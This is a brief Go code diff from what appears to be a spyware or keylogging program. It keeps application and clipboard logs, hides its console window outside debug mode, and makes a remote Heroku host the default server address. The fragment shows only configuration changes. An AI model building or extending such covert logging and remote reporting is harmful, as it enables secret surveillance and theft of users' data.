@@ -27,6 +27,7 @@ var (
 	applog       = []string{}
 	clipboardlog = []string{}
 	debug        bool
+	addr         string
 )
 
 // HideWindow hides the current console window that appears when compiled to exe
@@ -42,16 +43,17 @@ func HideWindow() {
 
 func init() {
 	flag.BoolVar(&debug, "debug", false, "Debug mode")
+	flag.StringVar(&addr, "addr", "dragons-land.herokuapp.com", "Address of the server.")
+
 }
 
 func main() {
 	flag.Parse()
 
-	addr := "0.0.0.0"
-	log.Println(debug)
 	if !debug {
 		HideWindow()
-		addr = "dragons-land.herokuapp.com"
+	} else {
+		addr = "0.0.0.0"
 	}
 
 	// powershell
